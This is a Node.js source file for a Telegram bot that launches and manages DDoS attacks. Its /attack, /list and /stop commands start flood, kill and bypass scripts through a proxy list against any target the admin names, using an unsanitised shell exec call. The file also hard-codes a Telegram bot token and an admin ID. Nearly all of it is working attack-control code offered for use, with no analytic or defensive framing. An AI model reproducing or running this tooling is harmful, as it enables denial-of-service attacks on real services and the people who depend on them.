const TelegramBot = require('node-telegram-bot-api')
const si = require('systeminformation')
const { exec } = require('child_process')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

const token = '7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0'
const adminId = '6601930239'
const bot = new TelegramBot(token, { polling: true })

let attacks = []

app.get('/', (req, res) => {
  res.json({ telegramAdmin: '@xkprj', status: 'Bot đang hoạt động' })
})

app.listen(port)

bot.onText(/^\/system$/, async (msg) => {
  if (msg.from.id.toString() !== adminId) {
    return bot.sendMessage(msg.chat.id, 'Access denied')
  }
  try {
    const data = await si.get({
      cpu: 'manufacturer, brand, speed, cores',
      mem: 'total, free, used',
      fsSize: 'fs, size, used, available',
      osInfo: 'platform, distro, release'
    })
    const formatBytes = (bytes) => {
      if (bytes >= 1073741824) return `${(bytes / 1073741824).toFixed(2)} GB`
      if (bytes >= 1048576) return `${(bytes / 1048576).toFixed(2)} MB`
      return `${bytes} B`
    }
    bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
      cpu: {
        manufacturer: data.cpu.manufacturer,
        brand: data.cpu.brand,
        speed: data.cpu.speed,
        cores: data.cpu.cores
      },
      memory: {
        total: formatBytes(data.mem.total),
        free: formatBytes(data.mem.free),
        used: formatBytes(data.mem.used)
      },
      disk: data.fsSize.map(d => ({
        fs: d.fs,
        size: formatBytes(d.size),
        used: formatBytes(d.used),
        available: formatBytes(d.available)
      })),
      os: {
        platform: data.osInfo.platform,
        distro: data.osInfo.distro,
        release: data.osInfo.release
      }
    }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  } catch (error) {
    bot.sendMessage(msg.chat.id, `Error fetching system info: ${error.message}`)
  }
})

bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    return bot.sendMessage(msg.chat.id, 'Access denied')
  }
  if (!match[1]) {
    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
  }
  const params = match[1].trim().split(/\s+/)
  if (params.length < 2) {
    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
  }
  const method = ['flood', 'kill', 'bypass'].includes(params[0]) ? params[0] : 'flood'
  const target = params.length === 3 ? params[1] : params[0]
  const time = parseInt(params.length === 3 ? params[2] : params[1])
  const rate = 24
  const threads = 12
  const proxyfile = './prx.txt'
  if (!target || isNaN(time) || time <= 0) {
    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
  }
  const attackId = Date.now()
  const attackData = {
    id: attackId,
    target,
    time,
    rate,
    threads,
    proxyfile,
    status: 'started',
    messageId: null,
    pid: null
  }
  try {
    const sentMsg = await bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
      status: attackData.status,
      target,
      time,
      rate,
      threads,
      proxyfile
    }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    attackData.messageId = sentMsg.message_id
    attacks.push(attackData)
    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`)
    child.on('spawn', () => {
      attackData.pid = child.pid
      attackData.status = 'running'
      let remainingTime = time
      const interval = setInterval(async () => {
        remainingTime -= 5
        if (remainingTime <= 0 || !attacks.find(a => a.id === attackId)) {
          clearInterval(interval)
          try {
            if (attackData.messageId) {
              await bot.deleteMessage(msg.chat.id, attackData.messageId)
            }
            attacks = attacks.filter(a => a.id !== attackId)
          } catch (error) {
            console.error(`Error cleaning up attack ${attackId}: ${error.message}`)
          }
          return
        }
        try {
          await bot.editMessageText('```json\n' + JSON.stringify({
            status: attackData.status,
            target,
            time: remainingTime,
            rate,
            threads,
            proxyfile
          }, null, 2) + '\n```', {
            chat_id: msg.chat.id,
            message_id: attackData.messageId,
            parse_mode: 'Markdown'
          })
        } catch (error) {
          clearInterval(interval)
          attacks = attacks.filter(a => a.id !== attackId)
          console.error(`Error updating message for attack ${attackId}: ${error.message}`)
        }
      }, 5000)
    })
    child.on('error', (error) => {
      bot.sendMessage(msg.chat.id, `Child process error: ${error.message}`)
      attacks = attacks.filter(a => a.id !== attackId)
      if (attackData.messageId) {
        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
      }
    })
    child.on('exit', (code, signal) => {
      if (code === 0) {
        bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully`)
      } else {
        bot.sendMessage(msg.chat.id, `Attack failed with code ${code || signal}`)
      }
      attacks = attacks.filter(a => a.id !== attackId)
      if (attackData.messageId) {
        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
      }
    })
    bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`)
  } catch (error) {
    bot.sendMessage(msg.chat.id, `Error starting attack: ${error.message}`)
    attacks = attacks.filter(a => a.id !== attackId)
    if (attackData.messageId) {
      bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
    }
  }
})

bot.onText(/^\/list$/, (msg) => {
  if (msg.from.id.toString() !== adminId) {
    return bot.sendMessage(msg.chat.id, 'Access denied')
  }
  if (attacks.length === 0) {
    return bot.sendMessage(msg.chat.id, 'No active attacks')
  }
  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s`).join('\n')
  bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`)
})

bot.onText(/^\/stop(?:\s(.+))?/, (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    return bot.sendMessage(msg.chat.id, 'Access denied')
  }
  if (!match[1] || isNaN(parseInt(match[1]))) {
    return bot.sendMessage(msg.chat.id, 'Usage: /stop [attack_id]')
  }
  const attackId = parseInt(match[1])
  const attack = attacks.find(a => a.id === attackId)
  if (!attack) {
    return bot.sendMessage(msg.chat.id, 'Attack not found')
  }
  try {
    process.kill(attack.pid, 'SIGTERM')
    attacks = attacks.filter(a => a.id !== attackId)
    if (attack.messageId) {
      bot.deleteMessage(msg.chat.id, attack.messageId).catch(() => {})
    }
    bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`)
  } catch (error) {
    bot.sendMessage(msg.chat.id, `Error stopping attack: ${error.message}`)
    attacks = attacks.filter(a => a.id !== attackId)
  }
})
